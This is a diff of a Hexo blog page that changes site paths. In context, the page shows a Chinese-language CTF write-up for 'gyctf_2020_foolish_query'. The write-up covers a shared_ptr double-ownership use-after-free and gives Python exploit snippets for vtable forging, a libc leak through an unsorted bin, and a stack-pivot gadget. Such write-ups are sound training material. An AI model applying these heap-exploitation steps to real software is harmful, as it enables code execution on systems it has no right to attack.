@@ -5,33 +5,33 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/ha1vk/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
   <meta name="description" content="首先，检查一下程序的保护机制   然后，我们用IDA分析一下，在Query的构造函数中，如果我们查询的name存在，则将对应的对象从容易里取出，获得其shared_ptr对象，关键在于调用了shared ptr的get函数，取得了对象的指针值，用这个指针值创建了一个新的shared_ptr对象。漏洞点在于，从一个shared_ptr对象里取得了被托管的对象的地址值创建了一个新的shared_ptr">
 <meta property="og:type" content="article">
 <meta property="og:title" content="gyctf_2020_foolish_query(C++中的shared ptr指针的误用)">
-<meta property="og:url" content="https://github.com/ha1vk/2020/07/26/gyctf_2020_foolish_query/index.html">
+<meta property="og:url" content="https://github.com/2020/07/26/gyctf_2020_foolish_query/index.html">
 <meta property="og:site_name" content="ha1vk&#39;s blog">
 <meta property="og:description" content="首先，检查一下程序的保护机制   然后，我们用IDA分析一下，在Query的构造函数中，如果我们查询的name存在，则将对应的对象从容易里取出，获得其shared_ptr对象，关键在于调用了shared ptr的get函数，取得了对象的指针值，用这个指针值创建了一个新的shared_ptr对象。漏洞点在于，从一个shared_ptr对象里取得了被托管的对象的地址值创建了一个新的shared_ptr">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/gyctf_2020_foolish_query/image1.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/gyctf_2020_foolish_query/image2.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/gyctf_2020_foolish_query/image3.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/gyctf_2020_foolish_query/image4.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/gyctf_2020_foolish_query/image5.png">
+<meta property="og:image" content="https://github.com/2020/07/26/gyctf_2020_foolish_query/image1.png">
+<meta property="og:image" content="https://github.com/2020/07/26/gyctf_2020_foolish_query/image2.png">
+<meta property="og:image" content="https://github.com/2020/07/26/gyctf_2020_foolish_query/image3.png">
+<meta property="og:image" content="https://github.com/2020/07/26/gyctf_2020_foolish_query/image4.png">
+<meta property="og:image" content="https://github.com/2020/07/26/gyctf_2020_foolish_query/image5.png">
 <meta property="article:published_time" content="2020-07-26T11:33:11.000Z">
 <meta property="article:modified_time" content="2025-06-26T02:32:33.923Z">
 <meta property="article:author" content="ha1vk">
@@ -41,9 +41,9 @@
 <meta property="article:tag" content="堆风水">
 <meta property="article:tag" content="C++ shared_ptr">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/ha1vk/2020/07/26/gyctf_2020_foolish_query/image1.png">
+<meta name="twitter:image" content="https://github.com/2020/07/26/gyctf_2020_foolish_query/image1.png">
 
-<link rel="canonical" href="https://github.com/ha1vk/2020/07/26/gyctf_2020_foolish_query/">
+<link rel="canonical" href="https://github.com/2020/07/26/gyctf_2020_foolish_query/">
 
 
 <script id="page-configurations">
@@ -105,7 +105,7 @@
 
   <div class="site-meta">
 
-    <a href="/ha1vk/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">ha1vk's blog</h1>
       <span class="logo-line-after"><i></i></span>
@@ -126,27 +126,27 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
 
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
 
   </li>
         <li class="menu-item menu-item-about">
 
-    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -204,10 +204,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/07/26/gyctf_2020_foolish_query/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/2020/07/26/gyctf_2020_foolish_query/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="ha1vk">
       <meta itemprop="description" content="">
     </span>
@@ -242,7 +242,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                 </span>
             </span>
 
@@ -265,16 +265,16 @@
 
       
         <p>首先，检查一下程序的保护机制</p>
-<img src="/ha1vk/2020/07/26/gyctf_2020_foolish_query/image1.png" class="">
+<img src="/2020/07/26/gyctf_2020_foolish_query/image1.png" class="">
 
 <p>然后，我们用IDA分析一下，在Query的构造函数中，如果我们查询的name存在，则将对应的对象从容易里取出，获得其shared_ptr对象，关键在于<strong>调用了shared ptr的get函数，取得了对象的指针值</strong>，用这个指针值创建了一个新的shared_ptr对象。漏洞点在于，从一个shared_ptr对象里取得了被托管的对象的<strong>地址值</strong>创建了一个新的shared_ptr对象，因此，前面shard_ptr指针里的计数不会被传递给新创建的这个shared_ptr对象，因此这个局部的shared_ptr对象析构时，把受托管的对象也给free掉了。</p>
-<img src="/ha1vk/2020/07/26/gyctf_2020_foolish_query/image2.png" class="">
+<img src="/2020/07/26/gyctf_2020_foolish_query/image2.png" class="">
 
 <p>因此，我们第一次query，创建了一个对象，第二次query这个对象，将使得该对象被free，第三次query将使得程序崩溃，原因是结构体里的指针由于free被破坏了。经过分析，对象的结构体是这样的</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">   <span class="type">void</span> *func_tables;</span><br><span class="line">   <span class="built_in">string</span> name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>由于UAF，我们可以通过feedback申请堆，将释放的这个结构体申请回来进行伪造。首先，我们通过feedback功能，可以直接获得堆地址</p>
-<img src="/ha1vk/2020/07/26/gyctf_2020_foolish_query/image3.png" class="">
+<img src="/2020/07/26/gyctf_2020_foolish_query/image3.png" class="">
 
 <p>那么我们把伪造的虚表存到堆里先。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_ZN9WordQueryD2Ev = <span class="number">0x000000000040BF00</span></span><br><span class="line">_ZN9WordQueryD0Ev = <span class="number">0x000000000040BF50</span></span><br><span class="line">_ZNK9WordQuery4evalERK9TextQuery = <span class="number">0x000000000040BDB0</span></span><br><span class="line">_ZNK9WordQuery3repB5cxx11Ev = <span class="number">0x000000000040BE08</span></span><br><span class="line">_Z11secertQueryv = <span class="number">0x0000000000402EA9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造虚表</span></span><br><span class="line">feedback(p64(_ZN9WordQueryD2Ev) + p64(_ZN9WordQueryD0Ev) + p64(_ZNK9WordQuery4evalERK9TextQuery) + p64(_ZNK9WordQuery3repB5cxx11Ev))</span><br></pre></td></tr></table></figure>
@@ -282,12 +282,12 @@
 <p>这个伪造的虚表与程序原来真正的虚表是一模一样的，因为第一步我们的目的不是执行代码，我们得伪造Node结构体里的string对象，进而能够读取任意地址，从而泄露libc地址。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">basic_query(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"><span class="comment">#UAF</span></span><br><span class="line">basic_query(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">feedback(p64(fake_vtable_addr) + p64(heap_addr - <span class="number">0x30</span>) + p64(<span class="number">0x100</span>) + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#remote</span></span><br></pre></td></tr></table></figure>
 
-<p>如上，我们这一步主要是控制了string对象， <img src="/ha1vk/2020/07/26/gyctf_2020_foolish_query/image4.png" class=""></p>
+<p>如上，我们这一步主要是控制了string对象， <img src="/2020/07/26/gyctf_2020_foolish_query/image4.png" class=""></p>
 <p>因为每次query，都会打印出name，因此控制name，我们可以读取堆里任意地址的数据，我们在后面再通过feedback功能，由于feedback里string对象的扩充，会得到unsorted bin，从而，我们进行query的时候可以泄露unsorted bin里的数据。我们只需要控制string对象里的length成员，即可控制数据泄露的长度。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#制造一个unsorted bin</span></span><br><span class="line">feedback(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x200</span>)</span><br><span class="line"><span class="comment">#泄露出数据</span></span><br><span class="line">basic_query(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">result = sh.recvuntil(<span class="string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&#x27;</span>,drop = <span class="literal">True</span>)</span><br><span class="line">main_arena_88 = u64(result[-<span class="number">8</span>:])</span><br></pre></td></tr></table></figure>
 
 <p>泄露出数据以后，由于找不到合适的one_gadget，因此，我们只能做栈迁移。通过调试，我们发现，在函数虚表里的第三个函数调用时，寄存器状态如下</p>
-<img src="/ha1vk/2020/07/26/gyctf_2020_foolish_query/image5.png" class="">
+<img src="/2020/07/26/gyctf_2020_foolish_query/image5.png" class="">
 
 <p>其中rax指向的就是这个对象，而[rax]指向的就是虚表。我们找到一个合适的gadget</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, qword ptr [rax] ; </span><br><span class="line">mov rax, qword ptr [rdi + <span class="number">0x38</span>] ; </span><br><span class="line">call qword ptr [rax + <span class="number">0x20</span>]</span><br></pre></td></tr></table></figure>
@@ -302,11 +302,11 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/ha1vk/tags/unsorted-bin/" rel="tag"># unsorted bin</a>
-              <a href="/ha1vk/tags/UAF/" rel="tag"># UAF</a>
-              <a href="/ha1vk/tags/C-string/" rel="tag"># C++ string</a>
-              <a href="/ha1vk/tags/%E5%A0%86%E9%A3%8E%E6%B0%B4/" rel="tag"># 堆风水</a>
-              <a href="/ha1vk/tags/C-shared-ptr/" rel="tag"># C++ shared_ptr</a>
+              <a href="/tags/unsorted-bin/" rel="tag"># unsorted bin</a>
+              <a href="/tags/UAF/" rel="tag"># UAF</a>
+              <a href="/tags/C-string/" rel="tag"># C++ string</a>
+              <a href="/tags/%E5%A0%86%E9%A3%8E%E6%B0%B4/" rel="tag"># 堆风水</a>
+              <a href="/tags/C-shared-ptr/" rel="tag"># C++ shared_ptr</a>
           </div>
 
         
@@ -315,11 +315,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/07/26/X-nuca_2018_revenge/" rel="prev" title="X-nuca_2018_revenge(控制程序流程的新姿势+多字节的xchg指令会清零寄存器高位)">
+    <a href="/2020/07/26/X-nuca_2018_revenge/" rel="prev" title="X-nuca_2018_revenge(控制程序流程的新姿势+多字节的xchg指令会清零寄存器高位)">
       <i class="fa fa-chevron-left"></i> X-nuca_2018_revenge(控制程序流程的新姿势+多字节的xchg指令会清零寄存器高位)
     </a></div>
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/07/26/ASIS_2017_Babyheap_Windows_unlink/" rel="next" title="ASIS_2017_Babyheap_Windows_unlink">
+    <a href="/2020/07/26/ASIS_2017_Babyheap_Windows_unlink/" rel="next" title="ASIS_2017_Babyheap_Windows_unlink">
       ASIS_2017_Babyheap_Windows_unlink <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -391,20 +391,20 @@
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/ha1vk/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">233</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-            <a href="/ha1vk/categories/">
+            <a href="/categories/">
           
         <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/ha1vk/tags/">
+            <a href="/tags/">
           
         <span class="site-state-item-count">145</span>
         <span class="site-state-item-name">标签</span></a>
@@ -477,30 +477,30 @@
   </div>
 
   
-  <script src="/ha1vk/lib/anime.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/ha1vk/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/ha1vk/js/motion.js"></script>
-
-
-<script src="/ha1vk/js/schemes/muse.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/ha1vk/js/next-boot.js"></script>
+<script src="/js/schemes/muse.js"></script>
 
 
-
-
-  
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
 
 
 
